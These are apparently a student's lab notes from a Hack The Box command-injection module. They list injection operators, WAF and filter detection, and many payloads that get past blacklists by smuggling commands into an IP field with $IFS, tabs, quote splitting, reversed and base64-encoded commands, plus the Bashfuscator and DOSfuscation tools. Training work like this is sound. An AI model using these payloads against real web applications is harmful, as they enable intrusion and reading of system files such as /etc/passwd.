
# Detection

## Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |


# Injecting Commands

---

```
ping -c 1 127.0.0.1; whoami
```

![](../../attchments/Pasted%20image%2020260314140526.png)

# Other Injection Operators

Also Try to Url encode this
```
ping -c 1 127.0.0.1 && whoami
```

```
ping -c 1 127.0.0.1 || whoami
```


# Identifying Filters

## Filter/WAF Detection

In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the `PHP` web application itself. `If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

```
`127.0.0.1%0a
```
`THe above means that the new line charectaer(url encoded) was allowed`
# Bypassing Space Filters

```
`127.0.0.1%0a+whomai

this gave an invalid input error
```
`THe above also showde that the space is also blacklisted`


#### Using Tabs

Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept

```
127.0.0.1%0a%09
```
**The above payload got accepted so it means tab(%09) is allowed**

#### Using $IFS

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments

```
127.0.0.1%0a${IFS}
```
`This Above payload will also`

#### Using Brace Expansion

![](../../attchments/Pasted%20image%2020260316133455.png)

```
127.0.0.1%0a{ls,-la}
```


# Bypassing Other Blacklisted Characters

---

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

## Linux

![](../../attchments/Pasted%20image%2020260316134049.png)

So if we want only backslash then we can use the path variable and using string manipulation we can only select the `/`

![](../../attchments/Pasted%20image%2020260316134435.png)
`Above is how we can also get semicolon.`

`127.0.0.1${LS_COLORS:10:1}${IFS}`

## Windows

```
echo %HOMEPATH:~6,-11%
```
`Use the above to get slash in Windows`

```
$env:HOMEPATH[0]
```
`To get \`


We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables

### SHifting Charecters

#### The Core Concept: ASCII Shifting

Every character on your keyboard corresponds to a numeric value in the ASCII standard.

- The `[` character is represented by the decimal value **91**.
    
- The `\` character is represented by the decimal value **92**.
    

Because `\` (92) is exactly one position after `[` (91) in the ASCII table, we can send the safe character (`[`) and tell the Linux shell to mathematically "shift" it forward by one position to generate our blocked character (`\`).

```
127.0.0.1%0a%09ls${IFS}${PATH:0:1}home
```
`paylaod used to complete the question`


# Bypassing Blacklisted Commands

## Linux & Windows

```
w"h"o"am"i
```

```
w'h'o'am'i
```

`we cannot mix types of quotes` and `the number of quotes must be even`

`127.0.0.1%0aw'h'o'am'i`

## Linux Only

```
who$@ami
w\ho\am\i
```

# Advanced Command Obfuscation

## Case Maniupilation

case manipulation we change the letters case like capital or same to mnuipilate the WAF
(e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`).

In `Windows`, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in

```
WhOaMi
```
`Above can work for Windows Server Because they are case-insensative`


```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
`replace all upper-case characters with lower-case characters but till it will not work beacuse there are spaces or other illegal character`

Once we replace the spaces with tabs (`%09`), we see that the command works perfectly

```
$(a="WhOaMi";printf %s "${a,,}")
```

## Reversed Commands

nother command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time

##### Linux Reversing Commands

![](../../attchments/Pasted%20image%2020260317222316.png)

```
127.0.0.1%0a$(rev <<<'imaohw')
```
`Reversing payload for linux`

##### windows Reversing Commands

![](../../attchments/Pasted%20image%2020260317225328.png)

## Encoded Commands

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding).

```
echo -n 'cat /etc/passwd | grep 33' | base64
```
`Will give Base64 encoded Command`

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
`will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed`


```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```
`Windows Commnads to Base64 the string`

we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:
```
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

```
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```


----

# Evasion Tools

---

## Linux (Bashfuscator)

```
AntivenomisCrazy@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
AntivenomisCrazy@htb[/htb]$ cd Bashfuscator
AntivenomisCrazy@htb[/htb]$ pip install --upgrade setuptools
AntivenomisCrazy@htb[/htb]$ pip install .
```


```
AntivenomisCrazy@htb[/htb]$ cd ./bashfuscator/bin/
AntivenomisCrazy@htb[/htb]$ ./bashfuscator -h
```


```
./bashfuscator -c 'cat /etc/passwd'
```
`COmmand for Ofuscation`

```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-
```


## Windows (DOSfuscation)

```
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
```

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

